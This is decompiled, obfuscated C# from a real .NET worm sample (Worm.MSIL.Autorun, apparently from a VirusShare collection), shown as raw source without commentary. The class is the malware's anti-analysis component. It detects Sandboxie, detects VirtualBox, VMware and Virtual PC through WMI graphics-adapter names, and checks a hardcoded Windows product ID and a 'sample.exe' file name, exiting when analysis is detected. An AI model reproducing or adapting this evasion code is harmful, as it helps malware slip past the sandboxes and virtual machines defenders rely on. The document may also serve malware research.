// Decompiled with JetBrains decompiler
// Type: .
// Assembly: WoRmy 3.1, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 5B3F2157-9C5E-49FF-827C-36A43C2192D1
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00007-msil\Worm.MSIL.Autorun.bn-c84e33c1883ca2f034c2d20e5c59a5319d95e9525a9ab0a5111aecbd19ba55e7.exe

using \u001B\u0003;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace \u001B\u0003
{
  [StandardModule]
  internal sealed class \u001C\u0003
  {
    private static object \u0001;
    private static string \u0002;
    private static string \u0003 = "SELECT * FROM Win32_VideoController";
    private static RegistryKey \u0004 = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", false);
    private static object \u0005 = RuntimeHelpers.GetObjectValue(\u001C\u0003.\u0004.GetValue("ProductID"));
    private static string \u0006 = "76487-337-8429955-22614";

    [DllImport("kernel32", EntryPoint = "Sleep", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern void \u0012\u0002(long dwMilliseconds);

    [DllImport("Kernel32", EntryPoint = "GetModuleHandleA", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern long \u0087\u0003([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpmodulename);

    public static bool \u0088\u0003()
    {
      bool flag;
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num2 = 2;
        flag = Process.GetProcessesByName("SbieSvc").Length >= 1;
        goto label_7;
label_2:
        num1 = -1;
        switch (num2)
        {
          case 2:
            ProjectData.EndApp();
            goto label_7;
        }
      }
      catch (Exception ex) when (ex is Exception & num2 != 0 & num1 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_2;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_7:
      int num3 = flag ? 1 : 0;
      if (num1 == 0)
        return num3 != 0;
      ProjectData.ClearProjectError();
      return num3 != 0;
    }

    public static bool \u0089\u0003()
    {
      bool flag;
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num2 = 2;
        flag = Operators.ConditionalCompareObjectEqual(\u001C\u0003.\u0005, (object) \u001C\u0003.\u0006, false);
        goto label_7;
label_2:
        num1 = -1;
        switch (num2)
        {
          case 2:
            ProjectData.EndApp();
            goto label_7;
        }
      }
      catch (Exception ex) when (ex is Exception & num2 != 0 & num1 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_2;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_7:
      int num3 = flag ? 1 : 0;
      if (num1 == 0)
        return num3 != 0;
      ProjectData.ClearProjectError();
      return num3 != 0;
    }

    private static void \u008A\u0003()
    {
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num2 = 2;
        object Instance = Interaction.GetObject("winmgmts:");
        object[] objArray = new object[1]
        {
          (object) \u001C\u0003.\u0003
        };
        object[] Arguments = objArray;
        bool[] flagArray = new bool[1]{ true };
        bool[] CopyBack = flagArray;
        object obj = NewLateBinding.LateGet(Instance, (System.Type) null, "execquery", Arguments, (string[]) null, (System.Type[]) null, CopyBack);
        if (flagArray[0])
          \u001C\u0003.\u0003 = (string) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray[0]), typeof (string));
        string str = Conversions.ToString(obj);
        int index = 0;
        int length = str.Length;
        while (index < length)
        {
          \u001C\u0003.\u0002 = str[index].ToString();
          checked { ++index; }
        }
        goto label_11;
label_6:
        num1 = -1;
        switch (num2)
        {
          case 2:
            ProjectData.EndApp();
            goto label_11;
        }
      }
      catch (Exception ex) when (ex is Exception & num2 != 0 & num1 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_6;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_11:
      if (num1 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    public static bool \u008B\u0003()
    {
      bool flag;
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num2 = 2;
        \u001C\u0003.\u008A\u0003();
        flag = Operators.CompareString(\u001C\u0003.\u0002, "VM Additions S3 Trio32/64", false) == 0;
        goto label_7;
label_2:
        num1 = -1;
        switch (num2)
        {
          case 2:
            ProjectData.EndApp();
            goto label_7;
        }
      }
      catch (Exception ex) when (ex is Exception & num2 != 0 & num1 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_2;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_7:
      int num3 = flag ? 1 : 0;
      if (num1 == 0)
        return num3 != 0;
      ProjectData.ClearProjectError();
      return num3 != 0;
    }

    public static bool \u008C\u0003()
    {
      bool flag;
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num2 = 2;
        \u001C\u0003.\u008A\u0003();
        flag = Operators.CompareString(\u001C\u0003.\u0002, "VNware SVGA II", false) == 0;
        goto label_7;
label_2:
        num1 = -1;
        switch (num2)
        {
          case 2:
            ProjectData.EndApp();
            goto label_7;
        }
      }
      catch (Exception ex) when (ex is Exception & num2 != 0 & num1 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_2;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_7:
      int num3 = flag ? 1 : 0;
      if (num1 == 0)
        return num3 != 0;
      ProjectData.ClearProjectError();
      return num3 != 0;
    }

    public static bool \u008D\u0003()
    {
      bool flag;
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num2 = 2;
        \u001C\u0003.\u008A\u0003();
        flag = Operators.CompareString(\u001C\u0003.\u0002, "VirtualBox Graphics Adapter", false) == 0;
        goto label_7;
label_2:
        num1 = -1;
        switch (num2)
        {
          case 2:
            ProjectData.EndApp();
            goto label_7;
        }
      }
      catch (Exception ex) when (ex is Exception & num2 != 0 & num1 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_2;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_7:
      int num3 = flag ? 1 : 0;
      if (num1 == 0)
        return num3 != 0;
      ProjectData.ClearProjectError();
      return num3 != 0;
    }

    public static void \u008E\u0003()
    {
      string lpmodulename = "SBieDLL.dll";
      bool flag;
      if (\u001C\u0003.\u0087\u0003(ref lpmodulename) != 0L)
        flag = true;
      if (!flag)
        return;
      ProjectData.EndApp();
    }

    public static bool \u008F\u0003()
    {
      bool flag;
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num2 = 2;
        flag = Operators.CompareString(Application.ExecutablePath, Application.StartupPath + "\\sample.exe", false) == 0;
        goto label_7;
label_2:
        num1 = -1;
        switch (num2)
        {
          case 2:
            ProjectData.EndApp();
            goto label_7;
        }
      }
      catch (Exception ex) when (ex is Exception & num2 != 0 & num1 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_2;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_7:
      int num3 = flag ? 1 : 0;
      if (num1 == 0)
        return num3 != 0;
      ProjectData.ClearProjectError();
      return num3 != 0;
    }
  }
}
